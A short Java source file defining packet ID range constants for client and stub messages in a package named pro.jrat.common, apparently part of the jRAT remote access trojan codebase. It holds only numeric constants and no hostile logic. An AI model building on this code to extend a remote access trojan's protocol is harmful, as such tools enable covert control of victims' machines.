package pro.jrat.common;

public final class PacketRange {
	
	/**
	 * jRAT registered client outgoing packets, 0-99
	 */
	public static final int outgoingRange = 99; 
	
	/**
	 * jRAT registered client incoming packets, 0-68
	 */
	public static final int incomingRange = 68;
	
	
	public static final int incomingStubRange = outgoingRange;	
	public static final int outgoingStubRange = incomingRange;

}
